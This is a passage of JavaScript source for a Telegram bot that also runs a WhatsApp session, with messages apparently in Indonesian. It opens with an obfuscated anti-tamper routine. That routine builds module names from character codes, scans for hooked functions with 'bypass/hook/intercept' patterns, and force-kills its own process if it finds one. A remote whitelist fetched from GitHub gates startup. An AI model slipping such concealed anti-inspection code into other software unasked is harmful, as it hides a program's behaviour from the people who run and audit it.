(function() {
  'use strict'
  
  if (require.main !== module) {
    console.error('\n[!] SECURITY ALERT: Bot dipanggil melalui file lain')
    console.error('[!] File saat ini: ' + __filename)
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'))
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\n[!] SECURITY ALERT: Terdeteksi parent module')
    console.error('[!] Parent: ' + module.parent.filename)
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  const nativePattern = /\[native code\]/
  const proxyPattern = /Proxy|apply\(target/
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i
  
  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('')
  const nativeStr = buildStr([91,110,97,116,105,118,101,32,99,111,100,101,93])
  const exitStr = buildStr([101,120,105,116])
  const killStr = buildStr([107,105,108,108])
  const httpsStr = buildStr([104,116,116,112,115])
  const httpStr = buildStr([104,116,116,112])
  
  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn
  
  try {
    nativeExit = process[exitStr].bind(process)
    nativeKill = process[killStr].bind(process)
    nativeOn = process.on.bind(process)
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync
    nativePid = process.pid
  } catch(e) {
    nativeExit = process.exit
    nativeKill = process.kill
    nativePid = process.pid
  }
  
  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}) } catch(e) {}
      try { nativeExit(1) } catch(e) {}
      try { process.exit(1) } catch(e) {}
      while(1) {}
    }
  })()
  
  try {
    const M = require(buildStr([109,111,100,117,108,101]))
    const reqStr = M.prototype.require.toString()
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const exitFn = process[exitStr]
    const exitCode = exitFn.toString()
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override')
      forceKill()
    }
    
    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[X] process.exit has Proxy/Getter')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const killFn = process[killStr]
    const killCode = killFn.toString()
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const onFn = process.on
    const onCode = onFn.toString()
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[X] process.on overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const axios = require('axios')
    if (axios.interceptors.request.handlers.length > 0 || 
        axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected')
      forceKill()
    }
  } catch(e) {}
  
  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest']
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i])
          forceKill()
        }
      } catch(e) {}
    }
  })
  checkGlobals()
  
  try {
    const cp = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115]))
    const execStr = cp.execSync.toString()
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[X] execSync overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    if (typeof global.fetch !== 'undefined') {
      const fetchCode = global.fetch.toString()
      if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
        console.error('[X] Suspicious global.fetch override detected')
        forceKill()
      }
    }
  } catch(e) {}
  
  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr)
    if (desc && (desc.get || desc.set)) {
      console.error('[X] process.exit has getter/setter')
      forceKill()
    }
  } catch(e) {}
  
  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr)
        const reqFunc = https.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] https.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] https.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|statusCode:\s*403/.test(realToString)) {
          console.error('[X] https.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr)
        const reqFunc = http.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] http.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] http.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|blocked:\s*true/.test(realToString)) {
          console.error('[X] http.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  setTimeout(() => {
    checkHttps()
    checkHttp()
  }, 500)
  
  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[X] Runtime: require() detected')
        forceKill()
      }
      
      try {
        const M = require(buildStr([109,111,100,117,108,101]))
        const reqStr = M.prototype.require.toString()
        if (bypassPattern.test(reqStr)) {
          console.error('[X] Runtime: Module.require compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const exitFn = process[exitStr]
        const exitCode = exitFn.toString()
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[X] Runtime: process.exit compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const killFn = process[killStr]
        const killCode = killFn.toString()
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[X] Runtime: process.kill compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const axios = require('axios')
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[X] Runtime: Axios interceptors active')
          forceKill()
        }
      } catch(e) {}
      
      checkHttps()
      checkHttp()
      checkGlobals()
    }
  })()
  
  setInterval(monitor, 2000)
  setTimeout(monitor, 100)
  
})()

const { Telegraf, Markup, session } = require("telegraf");
const fs = require("fs");
const os = require("os");
const chalk = require("chalk");
const readline = require("readline");
const path = require("path");
const ms = require("ms");
const https = require("https");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessageContent,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@bellachu/baileys");
const pino = require("pino");
const axios = require("axios");
const FormData = require("form-data");
const { TOKEN_GINXJAL } = require("./config");
const BOT_TOKEN = TOKEN_GINXJAL;

const MODE_FILE = "./Tools/mode.json";
const crypto = require("crypto");

const premiumFile = "./database/premiumuser.json";
const adminFile = "./database/adminuser.json";
const ownerFile = "./database/owneruser.json";
const GROUP_FILE = "./Tools/groupmode.json";
const antiFotoFile = "./Tools/antifoto.json"
const safeFile = "./Tools/safeGroups.json";
const antiVideoFile = "./Tools/antivideo.json"
const premiumGroupsFile = "./Tools/premiumGroups.json";

const TOKENS_FILE = "./tokens.json";

const sessionPath = "./session";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

global.pairingMessage = null;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let isStarting = false;
let senderUsers = [];
let hasConnectedOnce = false;
let reconnectAttempts = 0;
let waConnected = false;

const maxReconnect = 10;
const usePairingCode = true;

/////// ////////////////
function getGroupMode() {
  try {

    if (!fs.existsSync(".mode")) {
      fs.mkdirSync(".mode")
    }

    if (!fs.existsSync(GROUP_FILE)) {
      fs.writeFileSync(
        GROUP_FILE,
        JSON.stringify({ group: "off" }, null, 2)
      )
      return "off"
    }

    const data = JSON.parse(fs.readFileSync(GROUP_FILE))
    return data.group || "off"

  } catch (err) {
    console.log("❌ Gagal membaca group mode:", err)
    return "off"
  }
}
//////////////////////////////////////
function setGroupMode(group) {
  if (!["on", "off"].includes(group)) return

  const data = { group }

  fs.writeFileSync(GROUP_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Group mode diset ke: ${group}`)
}
//////////////////////////////////////
const VALID_MODES = ["self", "public"]

function getMode() {
  try {
    if (!fs.existsSync(MODE_FILE)) {
      fs.writeFileSync(MODE_FILE, JSON.stringify({ mode: "self" }, null, 2))
      return "self"
    }

    const data = JSON.parse(fs.readFileSync(MODE_FILE))
    return data.mode || "self"

  } catch (err) {
    console.log("❌ Gagal membaca mode:", err)
    return "self"
  }
}
//////////////////////////////////////
function setMode(mode) {
  if (!VALID_MODES.includes(mode)) return

  const data = { mode }

  currentMode = mode
  fs.writeFileSync(MODE_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Mode bot diset ke: ${mode}`)
}

let currentMode = getMode()
//////////////
const spamLimit = new Map()
const SPAM_WINDOW = 5000
const SPAM_MAX = 4

function antiSpam(ctx) {
  if (!ctx.from?.id) return true

  const userId = ctx.from.id
  const now = Date.now()

  if (!spamLimit.has(userId)) {
    spamLimit.set(userId, [])
  }

  let timestamps = spamLimit.get(userId).filter(t => now - t < SPAM_WINDOW)

  timestamps.push(now)
  spamLimit.set(userId, timestamps)

  if (timestamps.length > SPAM_MAX) {
    return ctx.reply("🚫 Spam terdeteksi!")
  }

  setTimeout(() => spamLimit.delete(userId), SPAM_WINDOW + 1000)

  return true
}
///// ---- ( DATE ) ---- /////
function getCurrentDate() {
  return new Date().toLocaleDateString("id-ID", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  });
}

///// ---- ( RUNTIME & MEMORY ) ---- /////
function runtime(seconds) {
  seconds = Number(seconds);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor(seconds % 3600 / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

function memory() {
  return (process.memoryUsage().rss / 1024 / 1024).toFixed(0) + " MB";
}
// ================= SECURITY NO BYPASS =================//

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/ponzs212/database/refs/heads/main/token.json"; //// Ganti Dengan Raw Anda !



async function fetchValidTokens() {
  try {
    const { data } = await axios.get(GITHUB_TOKEN_LIST_URL);
    return Array.isArray(data.tokens) ? data.tokens : [];
  } catch (err) {
    console.log(chalk.red("❌ Gagal mengambil token dari GitHub"));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa bot..."));

  const validTokens = await fetchValidTokens();
  const botId = BOT_TOKEN.split(":")[0];

  if (!validTokens.length) {
    console.log("❌ Database token kosong");
    process.exit(1);
  }

  if (!validTokens.includes(botId)) {
    console.log(`❌ Bot ID ${botId} tidak terdaftar`);
    process.exit(1);
  }

  console.log(chalk.green(`
BOT NYALA
`));

  startBot();
}

function startBot() {
  console.log(chalk.red(`⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀  
  Bot Berhasil Terhubung System Deteksi Bypass Akan Di Lepas Secara Otomatis`))
}

validateToken()

/// ------ Start WhatsApp Session ------ ///
const startSesi = async () => {
  try {
    if (isStarting) return;
    isStarting = true;

    console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠖⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⢤⡀⠀⠀⠀⠀⢸⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡀⠈⠢⡀⠀⠀⢀⠀⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⡔⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠊⡹⠀⠀⠘⢄⠀⠈⠲⢖⠈⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠈⠢⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠁⢠⠞⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠉⠑⠢⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡠⠚⠁⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⠇⠀⡤⡀⠀⠀⠀⢀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢠⣾⣿⣷⣶⣤⣄⣉⠑⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠞⢁⣴⣾⣿⣿⡆⢇⠀⠀⠀⠀⠀⠸⡀⠀⠂⠿⢦⡰⠀⠀⠋⡄⠀⠀⠀⠀⠀⠀⠀⢰⠁⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⢆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡴⢁⣴⣿⣿⣿⣿⣿⣿⡘⡄⠀⠀⠀⠀⠀⠱⣔⠤⡀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⡜⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⢣⠀⠀⠀⠀⠀
⠀⠀⡼⢠⣾⣿⣿⣿⣿⣿⣿⣿⣧⡘⢆⠀⠀⠀⠀⠀⢃⠑⢌⣦⠀⠩⠉⠀⡜⠀⠀⠀⠀⠀⠀⢠⠃⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣣⡀⠀⠀⠀
⠀⠀⢰⢃⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠱⡀⠀⠀⠀⢸⠀⠀⠓⠭⡭⠙⠋⠀⠀⠀⠀⠀⠀⠀⡜⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡱⡄⠀⠀
⠀⠀⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢃⠀⠀⠀⢸⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⢀⠜⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠘⣆⠀
⠀⢸⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡘⣆⠀⠀⡆⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⡠⠖⣡⣾⠁⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢸⠀
⠀⡏⣾⣿⣿⣿⣿⡿⡛⢟⢿⣿⣿⣿⣿⣿⣿⣧⡈⢦⣠⠃⠀⠀⠀⠀⠀⢱⣀⠤⠒⢉⣾⡉⠻⠋⠈⢘⢿⣿⣿⣿⣿⠿⣿⣿⠏⠉⠻⢿⣿⣿⣿⣿⡘⡆
⢰⡇⣿⣿⠟⠁⢸⣠⠂⡄⣃⠜⣿⣿⠿⠿⣿⣿⡿⠦⡎⠀⠀⠀⠀⠀⠒⠉⠉⠑⣴⣿⣿⣎⠁⠠⠂⠮⢔⣿⡿⠉⠁⠀⠹⡛⢀⣀⡠⠀⠙⢿⣿⣿⡇⡇
⠘⡇⠏⠀⠀⠀⡾⠤⡀⠑⠒⠈⠣⣀⣀⡀⠤⠋⢀⡜⣀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠙⢿⡟⠉⡃⠈⢀⠴⣿⣿⣀⡀⠀⠀⠀⠈⡈⠊⠀⠀⠀⠀⠙⢿⡇⡇
⠀⠿⠀⠀⠀⠀⠈⠀⠉⠙⠓⢤⣀⠀⠁⣀⡠⢔⡿⠊⠀⠀⠀⠀⠙⢦⡀⠀⠐⠢⢄⡀⠁⡲⠃⠀⡜⠀⠹⠟⠻⣿⣰⡐⣄⠎⠀⠀⠀⠀⠀⠀⠀⠀⢣⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⠀⠙⢦⣀⢀⡴⠁⠀⠀⠀⠀⠉⠁⢱⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠈⢏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠈⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⢀⡴⠁⠀⠀⢀⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠘⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⣧⣠⠤⠤⠋⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠀⠀⠳⢄⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠊⠈⠁⠀⠀⠀⡔⠛⠲⣤⣀⣀⣀⠀⠈⢣⡀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⢀⡠⢔⠝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢈⠤⠒⣀⠀⠀⠀⠀⣀⠟⠀⠀⠀⠑⠢⢄⡀⠀⠀⠈⡗⠂⠀⠀⠀⠙⢦⠤⠒⢊⡡⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠒⣒⡁⠬⠦⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠒⢺⢠⠤⡀⢀⠤⡀⠠⠷⡊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠣⡀⡱⠧⡀⢰⠓⠤⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
────────────
☇ Bot Connect
────────────
`);

    if (sock?.ev) {
      sock.ev.removeAllListeners("connection.update");
      sock.ev.removeAllListeners("creds.update");
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      keepAliveIntervalMs: 25000,
      connectTimeoutMs: 60000,
      markOnlineOnConnect: true,
      emitOwnEvents: true,
      fireInitQueries: true
    });

    sock.ev.on("creds.update", saveCreds);

    console.log("🔐 Siap pairing / reconnect...");

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      const reason = lastDisconnect?.error?.output?.statusCode;

      if (connection === "connecting") {
        console.log("🔄 Connecting...");
      }

      if (connection === "open") {
        isWhatsAppConnected = true;
        isStarting = false;
        hasConnectedOnce = true;
        reconnectAttempts = 0;

        linkedWhatsAppNumber = sock.user?.id?.split(":")[0];

        console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠖⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⢤⡀⠀⠀⠀⠀⢸⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡀⠈⠢⡀⠀⠀⢀⠀⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⡔⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠊⡹⠀⠀⠘⢄⠀⠈⠲⢖⠈⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠈⠢⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠁⢠⠞⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠉⠑⠢⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡠⠚⠁⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⠇⠀⡤⡀⠀⠀⠀⢀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢠⣾⣿⣷⣶⣤⣄⣉⠑⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠞⢁⣴⣾⣿⣿⡆⢇⠀⠀⠀⠀⠀⠸⡀⠀⠂⠿⢦⡰⠀⠀⠋⡄⠀⠀⠀⠀⠀⠀⠀⢰⠁⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⢆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡴⢁⣴⣿⣿⣿⣿⣿⣿⡘⡄⠀⠀⠀⠀⠀⠱⣔⠤⡀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⡜⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⢣⠀⠀⠀⠀⠀
⠀⠀⡼⢠⣾⣿⣿⣿⣿⣿⣿⣿⣧⡘⢆⠀⠀⠀⠀⠀⢃⠑⢌⣦⠀⠩⠉⠀⡜⠀⠀⠀⠀⠀⠀⢠⠃⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣣⡀⠀⠀⠀
